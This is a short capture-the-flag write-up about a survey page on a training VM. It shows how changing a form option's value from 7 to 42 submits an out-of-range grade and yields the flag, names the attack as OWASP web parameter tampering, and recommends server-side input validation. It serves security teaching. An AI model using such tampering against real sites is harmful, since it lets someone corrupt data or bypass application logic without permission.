# Survey

On the Survey page <http://[VM_IP]/?page=survey> you can grade wil, alex, Thor, Ben, ol.

If we look on source code we see that an expected grade is between 1 and 10:
```
<form action="#" method="post">
	<input type="hidden" name="sujet" value="2">
    	<SELECT name="valeur" onChange='javascript:this.form.submit();'>
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
			<option value="4">4</option>
			<option value="5">5</option>
			<option value="6">6</option>
			<option value="7">7</option>
			<option value="8">8</option>
			<option value="9">9</option>
			<option value="10">10</option>
		</SELECT>
</form>
```

We can try changing survey value to 42, for example, and sending it.

```
<form action="#" method="post">
	<input type="hidden" name="sujet" value="2">
    	<SELECT name="valeur" onChange='javascript:this.form.submit();'>
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
			<option value="4">4</option>
			<option value="5">5</option>
			<option value="6">6</option>
			<option value="42">7</option>
			<option value="8">8</option>
			<option value="9">9</option>
			<option value="10">10</option>
		</SELECT>
</form>
```

We have our flag

## Explanation

Attack type: [Web Parameter Tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering): Hidden field manipulation

> When a web application uses hidden fields to store status information, a malicious user can tamper with the values stored on their browser and change the referred information.

Once the adversary has determined which hidden fields are not being validated by the server, they will manipulate them to change the normal behavior of the web application in a way that benefits the adversary.

## How to fix it

Do not forget to verify user input before processing it.
